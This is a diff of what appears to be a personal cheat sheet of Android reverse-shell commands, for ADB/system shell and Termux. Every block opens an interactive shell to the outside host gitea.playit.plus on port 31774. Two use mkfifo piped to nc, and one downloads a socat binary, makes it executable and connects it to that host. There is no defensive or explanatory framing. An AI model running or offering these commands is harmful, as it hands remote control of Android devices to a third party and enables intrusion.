@@ -1,12 +1,12 @@
+ADB Shell / System Shell Reverse Shell
 ```
-rm -f /data/local/tmp/f; mkfifo /data/local/tmp/f; cat /data/local/tmp/f | /system/bin/sh -i 2>&1 | nc gitea.playit.plus 31774 > /data/local/tmp/f
+curl https://raw.githubusercontent.com/bnsmb/binaries-for-Android/refs/heads/main/binaries/socat -o /data/local/tmp/socat && chmod 777 /data/local/tmp/socat && /data/local/tmp/socat exec:'/system/bin/sh',pty,stderr,setsid,sigint,sane tcp:gitea.playit.plus:31774
 ```
 
-
+Termux Reverse Shell
 ```
 rm -f /data/data/com.termux/files/usr/tmp/f; mkfifo /data/data/com.termux/files/usr/tmp/f; cat /data/data/com.termux/files/usr/tmp/f | /data/data/com.termux/files/usr/bin/bash -i 2>&1 | toybox nc gitea.playit.plus 31774 > /data/data/com.termux/files/usr/tmp/f
 ```
-
 
 ```
 cd /data/data/com.termux/files/usr/bin && \
